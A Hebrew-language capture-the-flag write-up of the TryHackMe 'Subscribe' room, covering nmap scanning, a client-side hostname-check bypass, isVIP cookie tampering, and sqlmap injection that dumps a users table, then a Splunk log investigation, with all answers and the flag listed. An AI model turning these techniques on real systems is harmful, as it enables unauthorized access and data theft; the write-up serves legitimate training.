# TryHack3M: Subscribe — Writeup
![[Pasted image 20260409125929.png|484]]

**רמה:** בינונית (דמוי ריאליסטי)  
**קטגוריה:** Web, Linux  
**פלטפורמה:** TryHackMe  
**מטרה:** `10.114.188.224`

---

## הסיפור המקדים

```
האתר של HackM3 כמעט הגיע ל־3 מיליון משתמשים,
אבל קבוצת האקרים בשם UG פרצה לשרת והשתלטה עליו.
בעקבות הפריצה, הם השביתו את עמוד ההרשמה, ולכן לא ניתן להוסיף משתמשים חדשים
והמונה נתקע על 2.99 מיליון.

המטרה שלך היא:
- לחקור איך התוקפים פרצו (וקטורי תקיפה)
- להשיג שוב גישה לשרת
- לשחזר את עמוד ההרשמה
- לבדוק לוגים כדי להבין מה בדיוק קרה
```

---

## Task 1 — הכנות

לפני הכל, מוסיפים את הכתובת ל־`/etc/hosts`:

```bash
echo "10.114.188.224 hackme.thm" | sudo tee -a /etc/hosts
```

---

## Task 2 — הפריצה עצמה

### שלב 1: סריקת רשת עם nmap

```bash
nmap -sV -sC -p- hackme.thm -T5
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-08 20:27 IDT
Nmap scan report for hackme.thm (10.114.188.224)
Host is up (0.066s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
8000/tcp  open  http     Splunkd httpd
8089/tcp  open  ssl/http Splunkd httpd (free license; remote login disabled)
8191/tcp  open  mongodb  MongoDB 3.6
40009/tcp open  http     Apache httpd 2.4.41 — 403 Forbidden
```

מתוך כל הפורטים, רק `80` ו־`8000` נגישים לנו בשלב הזה.

![[Pasted image 20260409122930.png]]

---

### שלב 2: מציאת קוד ההזמנה

כשנכנסים לדף ההרשמה `http://hackme.thm/sign_up.php`, מופיע מסך שמבקש **קוד הזמנה**:

![[Pasted image 20260409123013.png]]

פותחים את **Developer Tools** ומחפשים קבצי JS. מוצאים קובץ `invite.js` עם הקוד הבא:

![[צילום מסך 2026-04-08 203257.png]]

```javascript
function e() {
  var e = window.location.hostname;
  if (e === 'capture3millionsubscribers.thm') {
    var o = new XMLHttpRequest;
    o.open('POST', 'inviteCode1337HM.php', true);
    o.onload = function () {
      if (this.status == 200) {
        console.log('Invite Code:', this.responseText)
      } else {
        console.error('Error fetching invite code.')
      }
    };
    o.send()
  } else if (e === 'hackme.thm') {
    console.log('This function does not operate on hackme.thm')
  } else {
    console.log('Lol!! Are you smart enought to get the invite code?')
  }
}
```

הקוד בודק את שם הדומיין. אם המשתמש נמצא בדומיין `capture3millionsubscribers.thm` — הוא שולח בקשת `POST` לקובץ `inviteCode1337HM.php` ומחזיר קוד הזמנה.

**הפתרון:** מוסיפים את הדומיין הנוסף ל־`/etc/hosts`:

```bash
echo "10.114.188.224 capture3millionsubscribers.thm" | sudo tee -a /etc/hosts
```

![[צילום מסך 2026-04-08 203440.png]]

לאחר מכן, ב־**Burp Suite** שולחים בקשת `POST` ידנית לכתובת:

```
POST http://capture3millionsubscribers.thm/inviteCode1337HM.php
```

![[צילום מסך 2026-04-08 204522.png]]

**התשובה:**

```
✅ קוד ההזמנה: VkXgo:Invited30MnUsers
```

---

### שלב 3: הרשמה וקבלת סיסמת Guest

מכניסים את קוד ההזמנה בדף ההרשמה. מופיעה הודעת שגיאה שמכילה את פרטי משתמש ה־guest:

![[צילום מסך 2026-04-08 204623.png]]

```
guest@hackme.thm : wedidit1010
```

**התשובה:** `wedidit1010`

---

### שלב 4: גישה לתוכן VIP וגילוי ה־Secure Token

נכנסים עם פרטי ה־guest. האתר מציג שני חדרים — אחד חינמי ואחד לחברי VIP.  
בודקים את הקוקיות ומוצאים: `isVIP=false`.

משנים את הערך ל־`isVIP=true` (דרך DevTools או Burp Suite) וניגשים לחדר ה־VIP.

![[צילום מסך 2026-04-08 205256.png|697]]
![[צילום מסך 2026-04-08 205416.png]]
![[צילום מסך 2026-04-08 205422.png]]

שם מוצאים "מכונה מדומה" עם shell מוגבל שמאפשר רק את הפקודות הבאות:
- `whoami`
- `ls`
- `cat <filename>`

מריצים `ls` ומוצאים `config.php`. מריצים `cat config.php`:

```php
<?php
$SECURE_TOKEN= "ACC#SS_TO_ADM1N_P@NEL";
$urlAdminPanel= "http://admin1337special.hackme.thm:40009";
?>
```

**התשובה:** `ACC#SS_TO_ADM1N_P@NEL`

---

### שלב 5: כניסה לפאנל הניהול + SQL Injection

מוסיפים ל־`/etc/hosts`:

```bash
echo "10.114.188.224 admin1337special.hackme.thm" | sudo tee -a /etc/hosts
```
![[צילום מסך 2026-04-08 212456 1.png]]

ניגשים ל־`http://admin1337special.hackme.thm:40009/public/html/login.php`. 

![[צילום מסך 2026-04-08 212917.png]]

מנסים להכניס `'` בשדה username — מקבלים שגיאת MySQL. **הדף פגיע ל־SQL Injection!**

מריצים **sqlmap** על הבקשה:

```bash
sqlmap -r req.txt --dbs --batch
```

```
available databases [6]:
[*] hackme
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] sys
```

```bash
sqlmap -r req.txt --batch -D hackme --tables
```

```
Database: hackme
[2 tables]
+--------+
| config |
| users  |
+--------+
```

```bash
sqlmap -r req.txt --batch -D hackme -T users --dump
```

sqlmap זיהה את נקודות הפגיעות הבאות:

```
Parameter: JSON username ((custom) POST)
    Type: boolean-based blind
    Type: error-based
    Type: time-based blind
```

sqlmap הוציא את טבלת המשתמשים כולל פרטי admin. נכנסים לפאנל הניהול.

![[צילום מסך 2026-04-08 214454.png]]

בפאנל הניהול משנים את Action מ־`disabled` ל־`Sign Up` ושומרים.

עוברים ל־`http://capture3millionsubscribers.thm/` — **הדגל מופיע!** 🎉
![[צילום מסך 2026-04-08 214635.png]]

**התשובה:** `TryHack3M{3MSUBSCRIBERS}`

---

## Task 3 — חקירה עם Splunk (Blue Team)

נכנסים ל־Splunk בפורט `8000` עם פרטי הכניסה של TryHackMe.

### כמה אירועים נאספו בסך הכל?

ב־Search and Reporting מריצים:

```
index=*
```

משנים את טווח הזמן ל־**All Time**. התוצאה: **10,530 אירועים**.

### מה כלי התקיפה ששימש את התוקף?

בצד שמאל מחפשים בפילטרים את **User Agent**. מוצאים ערך שמכיל `sqlmap` — זהו כלי התקיפה שבו השתמשו.

### כמה בקשות שלח התוקף?

בוחרים את הפילטר של sqlmap וסופרים את האירועים — הספירה שמופיעה בצד שמאל למעלה היא התשובה.

### מאיזו טבלה גנב התוקף מידע?

מחפשים בלוגים את מילת המפתח `FROM` (שמשמשת בשאילתות SQL):

```
index=* FROM
```

מוצאים אירוע בודד שמגלה את שם הטבלה שהתוקף ניגש אליה.

---

## סיכום

| שאלה | תשובה |
|------|-------|
| קוד הזמנה לאתר | `VkXgo:Invited30MnUsers` |
| סיסמת guest@hackme.thm | `wedidit1010` |
| Secure Token לפאנל הניהול | `ACC#SS_TO_ADM1N_P@NEL` |
| הדגל הסופי | `TryHack3M{3MSUBSCRIBERS}` |

---

## וקטורי התקיפה שנחשפו

1. **Hostname Validation Bypass** — קוד JavaScript בצד הלקוח שניתן לעקוף על ידי שינוי `/etc/hosts`
2. **Cookie Manipulation** — ערך `isVIP` נבדק בצד הלקוח בלבד
3. **SQL Injection** — שדה login פגיע בפאנל הניהול (boolean-based blind, error-based, time-based)
4. **Sensitive Data Exposure** — `config.php` חשוף דרך shell מוגבל

---

Writeup by: ReddCrow | TryHackMe: https://tryhackme.com/p/ReddCrow

